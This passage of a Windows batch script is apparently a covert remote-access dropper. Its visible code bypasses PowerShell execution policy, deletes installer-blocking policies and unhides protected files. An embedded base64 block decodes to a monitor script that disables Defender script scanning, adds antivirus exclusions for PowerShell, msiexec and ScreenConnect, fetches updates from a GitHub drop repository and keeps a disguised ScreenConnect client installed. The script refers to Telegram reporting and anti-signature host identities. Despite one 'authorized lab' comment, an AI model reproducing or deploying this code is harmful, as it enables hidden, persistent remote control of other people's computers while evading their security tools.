:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIwMjYwODA0TTYzDQpy
::ZW0gIE02MzogT0JTRVJWRSBzdGlsbCBibG9ja3MgUkVJTlNUQUxMOy94IOKAlCBh
::bGxvd3MgSEVBTCBzdGFydCArIDEwNjAgL2kgKEcxMCkuDQpyZW0gIE02MjogUXVl
::dWVHcnl4YUhlYWwgaGFyZC1ibG9ja2VkIHVuZGVyIE9CU0VSVkU7IHBhaXIgd2l0
::aCBHMTAgKG5vIHNoYXJlZCBQcm9kdWN0Q29kZSAveCkuDQpyZW0gIE02MTogYXJt
::IGdyeXhhX3dhdGNoIExPT1Ag4oCUIHJlY29yZCBhbGwgR3J5eGEgaW50ZXJmZXJl
::bmNlOyBUZWxlZ3JhbSBvbiBEUk9QIHdpdGggQ0FVU0UuDQpyZW0gIE02MDogT0JT
::RVJWRSBtb2RlIOKAlCBubyBoZWFsL2ZvcmNlL3JlaW5zdGFsbDsgbG9nIGhlYWx0
::aCB0byBkcm9wX3RyYWNlLmxvZyAocHJvdmUgZHJvcCBjYXVzZSkuDQpyZW0gIE01
::OTogc3RvcCBkcm9wK3JlaW5zdGFsbCDigJQgY2xlYXIgZm9yY2UgU0tJUCBpZiBo
::ZWFsdGh5OyBIRUFML0Vuc3VyZSAxMDYwLW9ubHk7IEc5IG5ldmVyIC94IG9uIEhF
::QUwuDQpyZW0gIE01ODogc3RpY2t5IHZlcnNpb25fZmxvb3IuY2ZnIOKAlCBvbmNl
::IHVwZGF0ZWQsIG5ldmVyIGFwcGx5L3J1biBvbGRlciBtb24vbGliL2dyeXhhIGFn
::YWluLg0KcmVtICBNNTc6IGZsZWV0X2NoYW5uZWwuY2ZnIHBpbitmbG9vcjsgY21k
::LWZpcnN0IEdyeXhhIGhlYWx0aCAoaWdub3JlIEFNU0kgZ2FyYmFnZSk7IG5vIGRv
::d25ncmFkZS4NCnJlbSAgTTUyOiBhdXRvLWhlYWwgc3R1Y2sgR3J5eGEgKDEwNjAr
::ZGlyIC8gUlVOTklORyBubyBncnl4YS5jb20gSW1hZ2VQYXRoKSB2aWEgRjgvRzc7
::IHJlc3RvcmUgbGliIGlmIEFWIGF0ZSBpdC4NCnJlbSAgTTUxOiBmb3JjZV9ncnl4
::YS5mbGFnIHF1ZXVlcyBvd25fZ3J5eGFfZm9yY2UgUkVJTlNUQUxMIChwYW5lbCB3
::aXBlKS4gRGFpbHkgcGF0aCBzdGF5cyBmcmVlemUuDQpyZW0gIE01MDogaGFzaC1t
::aXNtYXRjaCDihpIgQlVJTEQgZmFsbGJhY2sgKHVuc3RpY2sgQ0ROLXN0YWxlIG1h
::aW4pLg0KcmVtICBNNDk6IEZSRUVaRSAtIG5vIGF1dG8gR3J5eGEgbXNpZXhlYyBm
::cm9tIG1vbjsgc3RhcnQtb25seTsgbWFudWFsIGZvcmNlIG9ubHkuDQpyZW0gIE00
::ODogSEFORFMtT0ZGIGFsbCBTQyBpbnRlcnJ1cHQg4oCUIG9ubHkgR3J5eGEgaW5z
::dGFsbC1pZi1hYnNlbnQuIE5vIGV4dGVybWluYXRlL3NldnJ6IC9pL3NjIGRlbGV0
::ZS4NCnJlbSAgTTQ3OiBIQVJEIHN0b3AgR3J5eGEgaW50ZXJydXB0cyDigJQgbm8g
::cmF3IHNldnJ6IC9pOyBkZXRlY3QgYW55IG5vbi1zZXZyeiBTQzsgYWRvcHQgbGl2
::ZSBGUC4NCnJlbSAgTTQ2OiBTVEFSVF9QRU5ESU5HID0gYWxpdmU7IG5ldmVyIC94
::IEdyeXhhIHdoaWxlIHNlcnZpY2UgZXhpc3RzIChjb25uZWN0LWRyb3ApLg0KcmVt
::ICBNNDU6IEw0MiBzYWZlIEZQIG1pZ3JhdGUgKGluc3RhbGwgbmV3IGJlZm9yZSBy
::ZW1vdmluZyBvbGQgR3J5eGEpLg0KcmVtICBNNDQ6IGZvcmNlX2dyeXhhLmZsYWcg
::bXVzdCBOT1QgL3ggbGl2ZSBHcnl4YSAoTDQxIGZvcmNlLXNraXAtaWYtcnVubmlu
::ZykuDQpyZW0gIE00MzogQU1TSS1wcm9vZiBHcnl4YSBmYWxsYmFjayB2aWEgb3du
::X2dyeXhhLmNtZCAocHVyZSBtc2lleGVjKSB3aGVuIFBTIGJsb2NrZWQvbWlzc2lu
::Zy4NCnJlbSAgTTQyOiBzaWduZWQgbWFuaWZlc3Q7IHNldnJ6LmNmZzsgc2libGlu
::Zy1zYWZlIHNldnJ6IC9pLg0KcmVtICBBdXRob3JpemVkIGludGVybmFsIGRlcGxv
::eW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4NCnJlbSDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZANCnNldGxvY2Fs
::IEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCg0Kc2V0ICJLRUVQX0ZQPTVmNjAxMDU3
::OTg1MmU1MDciDQpzZXQgIkFMVF9GUD1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJH
::UllYQV9GUD0zNmU1MDZmZjAxNmIyMTUxIg0Kc2V0ICJXRD1DOlxQcm9ncmFtRGF0
::YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiRVRM
::PUM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNh
::Y2hlIg0Kc2V0ICJMT0c9JVdEJVxvd25fbW9uLmxvZyINCnNldCAiU1RBVEU9JVdE
::JVxvd25fbW9uLnN0YXRlIg0Kc2V0ICJIQkZMQUc9JVdEJVxoYi5mbGFnIg0Kc2V0
::ICJDVVJMPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxjdXJsLmV4ZSINCnNldCAiVEc9
::aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1
::Yi1kcm9wL21haW4vdGdfcmVwb3J0LnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpz
::ZXQgIlRHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0
::aHViLWRyb3BAbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIN
::CnNldCAiT1dOU0VDPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94
::bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9zZWN1cmUuY21kP3Q9JVJBTkRP
::TSUlUkFORE9NJSINCnNldCAiT1dOU0VDMj1odHRwczovL2Nkbi5qc2RlbGl2ci5u
::ZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fc2VjdXJlLmNtZD90
::PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTk1PTj1odHRwczovL3Jhdy5naXRo
::dWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25f
::bW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTk1PTjI9aHR0cHM6
::Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4v
::b3duX21vbi5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05MSUI9aHR0
::cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
::cm9wL21haW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJP
::V05MSUIyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRo
::dWItZHJvcEBtYWluL293bl9saWIucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNl
::dCAiT1dOR1JZWEE9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hu
::b2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX2dyeXhhLmNtZD90PSVSQU5ET00l
::JVJBTkRPTSUiDQpzZXQgIk9XTkdSWVhBMj1odHRwczovL2Nkbi5qc2RlbGl2ci5u
::ZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fZ3J5eGEuY21kP3Q9
::JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOV0FUQ0g9aHR0cHM6Ly9yYXcuZ2l0
::aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vZ3J5
::eGFfd2F0Y2guY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOV0FUQ0gy
::PWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJv
::cEBtYWluL2dyeXhhX3dhdGNoLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQg
::Ik1BTklGRVNUX1VSTD1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v
::eG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi91cGRhdGUubWFuaWZlc3Q/dD0lUkFO
::RE9NJSVSQU5ET00lIg0Kc2V0ICJNQU5JRkVTVF9TSUdfVVJMPWh0dHBzOi8vcmF3
::LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWlu
::L3VwZGF0ZS5tYW5pZmVzdC5zaWc/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJT
::RVZSWl9FWFBfVVJMPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94
::bm9idWRkeS9naXRodWItZHJvcC9tYWluL3NldnJ6X2V4cGVjdGVkLmNmZz90PSVS
::QU5ET00lJVJBTkRPTSUiDQpzZXQgIlNFVlJaX0VYUF9VUkwyPWh0dHBzOi8vY2Ru
::LmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3NldnJ6
::X2V4cGVjdGVkLmNmZz90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk1TSV9VUkw9
::aHR0cHM6Ly91aS5zZXZyei5jb20vQmluL1NjcmVlbkNvbm5lY3QuQ2xpZW50U2V0
::dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiDQpzZXQgIk1TSV9HUllYQT1odHRwczov
::L3VpLmdyeXhhLmNvbS9CaW4vU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2k/
::ZT1BY2Nlc3MmeT1HdWVzdCINCnNldCAiTVNJX1BLRzE9aHR0cHM6Ly9yYXcuZ2l0
::aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vcGtn
::Lm1zaSINCnNldCAiTVNJX1BLRzI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2do
::L3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vcGtnLm1zaSINCnNldCAiTVNJPSVQ
::cm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2kiDQpzZXQg
::Ik1TSUNBQ0hFPSVXRCVccGtnLm1zaSINCnNldCAiTVNJX0c9JVByb2dyYW1EYXRh
::JVxTY3JlZW5Db25uZWN0LkdyeXhhLm1zaSINCnNldCAiTVNJQ0FDSEVfRz0lV0Ql
::XHBrZ19ncnl4YS5tc2kiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIgbWQgIiVXRCUi
::IDI+bnVsDQpyZW0gTTU2OiBBTVNJIGV4Y2x1c2lvbnMgRklSU1QgKGJlZm9yZSBh
::bnkgcG93ZXJzaGVsbCkg4oCUIEFWIHdhcyB3aXBpbmcgbGliIGFuZCBmb3JjaW5n
::IE0zNiBmYWxsYmFjaw0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xN
::aWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIg
::L3YgRGlzYWJsZVNjcmlwdFNjYW5uaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5u
::dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93
::cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIgL3QgUkVHX0RX
::T1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
::Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
::RVRMJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lv
::bnNcUGF0aHMiIC92ICIlU3lzdGVtUm9vdCVcVGVtcFwudXBkIiAvdCBSRUdfRFdP
::UkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
::cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQcm9jZXNzZXMiIC92
::ICJwb3dlcnNoZWxsLmV4ZSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
::DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVu
::ZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiU2NyZWVuQ29ubmVjdC5DbGll
::bnRTZXJ2aWNlLmV4ZSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpy
::ZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
::XEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAibXNpZXhlYy5leGUiIC90IFJFR19E
::V09SRCAvZCAwIC9mID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlw
::ZSBudWw+IiVMT0clIiAyPm51bA0KDQpzZXQgIk1PTlZFUj1NNjMiDQpzZXQgIk1P
::Tl9NSU49TTYyIg0Kc2V0ICJHSVRfUElOPSINCnNldCAiQ0hBTk5FTF9VUkw9aHR0
::cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
::cm9wL21haW4vZmxlZXRfY2hhbm5lbC5jZmc/dD0lUkFORE9NJSVSQU5ET00lIg0K
::c2V0ICJGTE9PUl9GSUxFPSVXRCVcdmVyc2lvbl9mbG9vci5jZmciDQpzZXQgIk1P
::Tl9GTE9PUj0wIg0Kc2V0ICJMSUJfRkxPT1I9MCINCnNldCAiR1JZWEFfRkxPT1I9
::MCINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJHUllYQV9E
::RUVQPSVXRCVcZ3J5eGFfZGVlcC5mbGFnIg0KcmVtIGxvYWQgY3VycmVudCBHcnl4
::YSBGUCAobWF5IHJvdGF0ZSB3aGVuIHNlcnZlci9rZXlzIGNoYW5nZSkNCmlmIGV4
::aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwq
::IGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIl
::JUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQppZiBub3QgZGVm
::aW5lZCBHUllYQV9GUCBzZXQgIkdSWVhBX0ZQPTM2ZTUwNmZmMDE2YjIxNTEiDQpm
::b3IgL2YgInRva2Vucz0xLTMgZGVsaW1zPS8gIiAlJWEgaW4gKCIlZGF0ZSUiKSBk
::byBzZXQgIkRUPSVkYXRlJSAldGltZSUiDQplY2hvLj4+IiVMT0clIg0KZWNobyDi
::lIDilIAgdGljayAhRFQhIFt2ZXIgJU1PTlZFUiVdIOKUgOKUgD4+IiVMT0clIg0K
::DQpyZW0gTTU4OiBzdGlja3kgdmVyc2lvbl9mbG9vci5jZmcg4oCUIG9uY2UgcmFp
::c2VkLCBuZXZlciBhcHBseSBvbGRlciBtb24vbGliL2dyeXhhDQppZiBleGlzdCAi
::JUZMT09SX0ZJTEUlIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1z
::PT0iICUlSyBpbiAoIiVGTE9PUl9GSUxFJSIpIGRvICgNCiAgaWYgL0kgIiUlSyI9
::PSJNT05fRkxPT1IiIHNldCAiTU9OX0ZMT09SPSUlTCINCiAgaWYgL0kgIiUlSyI9
::PSJMSUJfRkxPT1IiIHNldCAiTElCX0ZMT09SPSUlTCINCiAgaWYgL0kgIiUlSyI9
::PSJHUllYQV9GTE9PUiIgc2V0ICJHUllYQV9GTE9PUj0lJUwiDQopDQpzZXQgL2Eg
::X0NVUk09JU1PTlZFUjpNPSUgMj5udWwNCmlmIG5vdCBkZWZpbmVkIF9DVVJNIHNl
::dCAiX0NVUk09MCINCmlmICFfQ1VSTSEgR1RSICFNT05fRkxPT1IhIHNldCAiTU9O
::X0ZMT09SPSFfQ1VSTSEiDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0K
::ICBjYWxsIDpQYXJzZUxpYk51bSAiJVdEJVxvd25fbGliLnBzMSINCiAgaWYgIV9Q
::TiEgR1RSICFMSUJfRkxPT1IhIHNldCAiTElCX0ZMT09SPSFfUE4hIg0KKQ0KaWYg
::ZXhpc3QgIiVXRCVcb3duX2dyeXhhLmNtZCIgKA0KICBjYWxsIDpQYXJzZUdyeXhh
::TnVtICIlV0QlXG93bl9ncnl4YS5jbWQiDQogIGlmICFfUE4hIEdUUiAhR1JZWEFf
::RkxPT1IhIHNldCAiR1JZWEFfRkxPT1I9IV9QTiEiDQopDQpjYWxsIDpTYXZlRmxv
::b3INCnNldCAiQ09VTlQ9MCINCnNldCAiSU5TVEFMTEVEPTAiDQpzZXQgIlBSSU1f
::T0s9MCINCnNldCAiQUxUX09LPTAiDQpzZXQgIkZPUkVJR05fTEVGVD0wIg0Kc2V0
::ICJGT1JFSUdOX0xJU1Q9Ig0Kc2V0ICJNU0lFWElUPW5vdC1ydW4iDQoNCnJlbSDi
::lIDilIAgWzBdIHNpbmdsZS1mbGlnaHQgbXV0ZXggKHN0b3Agb3ZlcmxhcHBpbmcg
::dGlja3MgcmFjaW5nIG1zaWV4ZWMpIOKUgOKUgA0Kc2V0ICJNVVRFWD0lV0QlXHRp
::Y2subG9jayINCmlmIGV4aXN0ICIlTVVURVglIiAoDQogIGZvciAlJUEgaW4gKCIl
::TVVURVglIikgZG8gc2V0ICJMT0NLQUdFPSUlfnRBIg0KICBwb3dlcnNoZWxsIC1O
::b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRo
::ICclTVVURVglJykgLWFuZCAoKChHZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRlcmFs
::UGF0aCAnJU1VVEVYJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0
::ZXMgLWx0IDIwKSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYx
::DQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0
::ZXhfYnVzeT4+IiVMT0clIg0KICAgIGVuZGxvY2FsDQogICAgZXhpdCAvYiAwDQog
::ICkNCikNCmVjaG8gJURBVEUlICVUSU1FJSAlUkFORE9NJT4iJU1VVEVYJSINCg0K
::cmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUpIOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5w
::czEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
::dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
::b24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdE
::JVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxp
::bXM9PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0l
::JUwiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9V2VyUXVldWVT
::eW5jIg0KaWYgbm90IGRlZmluZWQgVEFTS19CIHNldCAiVEFTS19CPVBsYVNlcnZl
::ckhlYWx0aCINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQyBzZXQgIlRBU0tfQz1XZGlI
::b3N0UHJveHkiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Qgc2V0ICJUQVNLX0Q9VGNw
::SXBDb25mbGljdFJlcyINCmlmIG5vdCBkZWZpbmVkIE1PX0Egc2V0ICJNT19BPTIi
::DQppZiBub3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIg0KDQpyZW0g4pSA4pSA
::IFtBXSBhdXRvLXVwZGF0ZSBjb3JlIGZpbGVzIChiZXN0IGVmZm9ydCkg4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::DQppZiBub3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhlIg0KcmVt
::IE0zNTogZ3VhcmFudGVlIHVwZGF0ZSBjaGFubmVsIOKAlCB1bmhhcmRlbiB3b3Jr
::ZGlyIGVhY2ggdGljayBhbmQgc3RhZ2UgZG93bmxvYWRzDQpyZW0gaW4gQzpcV2lu
::ZG93c1xUZW1wIChuZXZlciBBQ0wtbG9ja2VkKSwgdGhlbiBtb3ZlIGludG8gJVdE
::JS4gTG9ja0RpciBjYW5ub3QgZnJlZXplIHVzLg0Kc2V0ICJTVEFHRT0lU3lzdGVt
::Um9vdCVcVGVtcFwudXBkIg0KaWYgbm90IGV4aXN0ICIlU1RBR0UlIiBta2RpciAi
::JVNUQUdFJSIgPm51bCAyPiYxDQpyZW0gTTU3L001ODogZmxlZXRfY2hhbm5lbC5j
::ZmcgcGluICsgcmFpc2Ugc3RpY2t5IGZsb29ycyAoY2hhbm5lbCBuZXZlciBsb3dl
::cnMgbG9jYWwgZmxvb3IpDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1j
::b25uZWN0LXRpbWVvdXQgNiAtLW1heC10aW1lIDE1IC1vICIlU1RBR0UlXGZsZWV0
::X2NoYW5uZWwuY2ZnIiAiJUNIQU5ORUxfVVJMJSIgPm51bCAyPiYxDQppZiBleGlz
::dCAiJVNUQUdFJVxmbGVldF9jaGFubmVsLmNmZyIgKA0KICBmb3IgL2YgInVzZWJh
::Y2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVTVEFHRSVcZmxlZXRf
::Y2hhbm5lbC5jZmciKSBkbyAoDQogICAgaWYgL0kgIiUlSyI9PSJNT05fTUlOIiBz
::ZXQgIk1PTl9NSU49JSVMIg0KICAgIGlmIC9JICIlJUsiPT0iTElCX01JTiIgc2V0
::ICJMSUJfTUlOPSUlTCINCiAgICBpZiAvSSAiJSVLIj09IkdSWVhBX01JTiIgc2V0
::ICJHUllYQV9NSU49JSVMIg0KICAgIGlmIC9JICIlJUsiPT0iR0lUX1BJTiIgc2V0
::ICJHSVRfUElOPSUlTCINCiAgKQ0KICBpZiBkZWZpbmVkIE1PTl9NSU4gKA0KICAg
::IHNldCAiX0NNPSFNT05fTUlOOk09ISINCiAgICBpZiAhX0NNISBHVFIgIU1PTl9G
::TE9PUiEgc2V0ICJNT05fRkxPT1I9IV9DTSEiDQogICkNCiAgaWYgZGVmaW5lZCBM
::SUJfTUlOICgNCiAgICBzZXQgIl9DTD0hTElCX01JTjpMPSEiDQogICAgaWYgIV9D
::TCEgR1RSICFMSUJfRkxPT1IhIHNldCAiTElCX0ZMT09SPSFfQ0whIg0KICApDQog
::IGlmIGRlZmluZWQgR1JZWEFfTUlOICgNCiAgICBzZXQgIl9DRz0hR1JZWEFfTUlO
::Okc9ISINCiAgICBpZiAhX0NHISBHVFIgIUdSWVhBX0ZMT09SISBzZXQgIkdSWVhB
::X0ZMT09SPSFfQ0chIg0KICApDQogIGNhbGwgOlNhdmVGbG9vcg0KICBpZiBkZWZp
::bmVkIEdJVF9QSU4gaWYgL0kgbm90ICIhR0lUX1BJTiEiPT0ibWFpbiIgaWYgbm90
::ICIhR0lUX1BJTiEiPT0iIiAoDQogICAgc2V0ICJPV05NT049aHR0cHM6Ly9yYXcu
::Z2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wLyFHSVRf
::UElOIS9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQogICAgc2V0ICJP
::V05MSUI9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5
::L2dpdGh1Yi1kcm9wLyFHSVRfUElOIS9vd25fbGliLnBzMT90PSVSQU5ET00lJVJB
::TkRPTSUiDQogICAgc2V0ICJPV05HUllYQT1odHRwczovL3Jhdy5naXRodWJ1c2Vy
::Y29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvIUdJVF9QSU4hL293bl9n
::cnl4YS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0KICAgIHNldCAiT1dOV0FUQ0g9
::aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1
::Yi1kcm9wLyFHSVRfUElOIS9ncnl4YV93YXRjaC5jbWQ/dD0lUkFORE9NJSVSQU5E
::T00lIg0KICAgIHNldCAiT1dOU0VDPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250
